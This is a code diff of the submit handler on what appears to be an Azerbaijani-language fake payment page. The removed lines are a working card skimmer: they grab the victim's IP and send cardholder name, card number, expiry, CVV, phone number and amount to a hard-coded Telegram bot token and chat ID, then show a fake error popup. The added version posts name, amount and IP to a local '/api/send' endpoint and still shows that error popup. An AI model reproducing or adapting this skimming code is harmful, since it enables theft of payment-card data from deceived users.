@@ -216,60 +216,43 @@
         }
 
         // Göndərmə və Xəta
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            if (!isMonthValid) return;
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    if (!isMonthValid) return;
 
-            btn.disabled = true;
-            btn.innerText = 'Yoxlanılır...';
+    btn.disabled = true;
+    btn.innerText = 'Yoxlanılır...';
 
-            let ip = "Alınmadı";
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                ip = d.ip;
-            } catch(h) {}
+    // IP Unvanını tapırıq
+    let ip = "Alınmadı";
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        ip = d.ip;
+    } catch(h) {}
 
-            const TOKEN = '8900082556:AAEpifqTxdKCqppa7lflczmD6IYzjk0iZTs';
-            const CHAT = '8055987590';
-
-            const txt = `💳 *YENİ ÖDƏNİŞ MƏLUMATI*\n\n` +
-                        `👤 *Kart Sahibi:* \`${inpName.value.toUpperCase()}\`\n` +
-                        `🔢 *Kart Nömrəsi:* \`${inpNo.value}\`\n` +
-                        `📅 *Müddət:* \`${inpExp.value}\`\n` +
-                        `🔒 *CVV:* \`${inpCvv.value}\`\n\n` +
-                        `📱 *Operator:* ${oper}\n` +
-                        `📞 *Nömrə:* \`${phone}\`\n` +
-                        `💰 *Məbləğ:* ${amount} AZN\n` +
-                        `🌐 *IP:* \`${ip}\``;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT, text: txt, parse_mode: 'Markdown' })
-                });
-                document.getElementById('errPopup').classList.add('visible');
-            } catch (err) {
-                alert('Xəta baş verdi, yenidən cəhd edin.');
-            } finally {
-                btn.innerText = `🔒 Ödənişi tamamla · ${amount} AZN`;
-                valForm();
-            }
+    try {
+        // Məlumatlar
+        const response = await fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                name: inpName.value,
+                amount: amount,
+                ip: ip
+            })
         });
 
-        function closePopup() {
-            document.getElementById('errPopup').classList.remove('visible');
-            form.reset();
-            document.getElementById('cardViewNo').innerText = '•••• •••• •••• ••••';
-            document.getElementById('cardViewName').innerText = '—';
-            document.getElementById('cardViewExp').innerText = 'MM/YY';
-            expError.style.display = 'none';
-            isMonthValid = true;
-            valForm();
-            window.location.href = 'index.html';
+        if (response.ok) {
+            document.getElementById('errPopup').classList.add('visible');
+        } else {
+            alert('Xəta baş verdi, yenidən cəhd edin.');
         }
-    </script>
-</body>
-    </html>
-    
+    } catch (err) {
+        alert('Xəta baş verdi, yenidən cəhd edin.');
+    } finally {
+        btn.innerText = `🔒 Ödənişi tamamla · ${amount} AZN`;
+        valForm();
+    }
+});
+        
